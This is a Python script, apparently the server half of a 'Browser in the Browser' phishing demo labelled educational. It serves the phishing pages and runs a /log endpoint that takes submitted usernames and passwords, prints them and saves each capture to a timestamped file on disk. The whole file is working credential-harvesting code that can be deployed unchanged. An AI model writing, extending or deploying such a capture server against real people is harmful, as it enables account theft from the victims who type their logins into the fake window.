#!/usr/bin/env python3
import http.server
import json
import os
from datetime import datetime

# Inheriting from SimpleHTTPRequestHandler instead of BaseHTTPRequestHandler.
# This grants the server native capabilities to host static HTML, CSS, and JS files seamlessly.
class EducationalBitBDumper(http.server.SimpleHTTPRequestHandler):
    
    # Graphic Startup Banner Interface
    @staticmethod
    def display_banner():
        RESET = "\033[0m"
        RED = "\033[91m"

        print(f"""
        {RED}██████╗ ███████╗██████╗ {RESET}      ██████╗ ██╗████████╗██████╗ 
        {RED}██╔══██╗██╔════╝██╔══██╗{RESET}      ██╔══██╗██║╚══██╔══╝██╔══██╗
        {RED}██████╔╝█████╗  ██║  ██║{RESET}█████╗██████╔╝██║   ██║   ██████╔╝
        {RED}██╔══██╗██╔══╝  ██║  ██║{RESET}╚════╝██╔══██╗██║   ██║   ██╔══██╗
        {RED}██║  ██║███████╗██████╔╝{RESET}      ██████╔╝██║   ██║   ██████╔╝
        {RED}╚═╝  ╚═╝╚══════╝╚═════╝ {RESET}      ╚═════╝ ╚═╝   ╚═╝   ╚═════╝ 
        {RED}Browser in the Browser demo created by {RESET}eMVee                                                  
        """)

    # Configures strict Cross-Origin Resource Sharing (CORS) handling parameters
    def _send_cors_headers(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")

    # Hook into Python's native header compiler to cleanly inject CORS tags 
    # without corrupting the raw HTTP protocol stream structure.
    def end_headers(self):
        self._send_cors_headers()
        super().end_headers()

    # Manages network pre-flight validation challenges sent by modern web browsers
    def do_OPTIONS(self):
        self.send_response(200)
        self.end_headers()

    # Overrides base file deployment routing mechanics to enforce custom version handling
    def do_GET(self):
        self.protocol_version = 'HTTP/1.1'
        # Let SimpleHTTPRequestHandler natively and cleanly serve your index.html/testing1.html
        super().do_GET()

    # Process incoming postback telemetry structures handling authentication captures
    def do_POST(self):
        # Route explicit capture validation packets directed towards logging endpoints
        if self.path == '/log':
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            
            # Map request telemetry body tracking context size parameters
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length)

            lines = "=" * 80
            print("\n" + lines)
            print("RED BITB DEMO: Credentials captured and saving to disk...")
            print(lines)
            
            timestamp_filename = datetime.now().strftime("%Y%m%d-%H%M%S") + ".txt"
            
            try:
                decoded_body = body.decode('utf-8')
                data = json.loads(decoded_body)
                
                username = data.get('username')
                password = data.get('password')
                receipt_time = data.get('timestamp')
                
                print(f"Username / Email: {username}")
                print(f"Potential password:    {password}")
                print(f"Time of receipt: {receipt_time}")
                
                with open(timestamp_filename, "w", encoding="utf-8") as f:
                    f.write(f"=== BITB CAPTURED DATA ===\n")
                    f.write(f"File Generated: {datetime.now().isoformat()}\n")
                    f.write(f"Receipt Time:   {receipt_time}\n")
                    f.write(f"Username/Email: {username}\n")
                    f.write(f"Password:       {password}\n")
                    f.write(f"{lines}\n")
                
                print(f"\n[+] Capture entry successfully committed to file: {timestamp_filename}")

            except Exception as e:
                raw_data = body.decode('utf-8')
                print(f"Raw data received: {raw_data}")
                
                with open(timestamp_filename, "w", encoding="utf-8") as f:
                    f.write(f"=== BITB RAW CAPTURED DATA (JSON Error) ===\n")
                    f.write(f"File Generated: {datetime.now().isoformat()}\n")
                    f.write(f"Raw Payload:\n{raw_data}\n")
                    f.write(f"Error Details:  {str(e)}\n")
                    f.write(f"{lines}\n")
                    
                print(f"\n[!] Parsing failure. Raw telemetry dumped to: {timestamp_filename}")
                
            print(lines + "\n")
        else:
            # Send a clean HTTP 405 error if a player sends an unauthorized POST request somewhere else
            self.send_error(405, "Method Not Allowed")


# Main execution scope listening globally on standard HTTP Port 80
if __name__ == '__main__':
    server_address = ('', 80)
    httpd = http.server.HTTPServer(server_address, EducationalBitBDumper)
    EducationalBitBDumper.display_banner()
    print("[!] Server actively hosting files and listening for logs on http://localhost:80 ...")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Server termination requested by user. Shuting down execution context.")
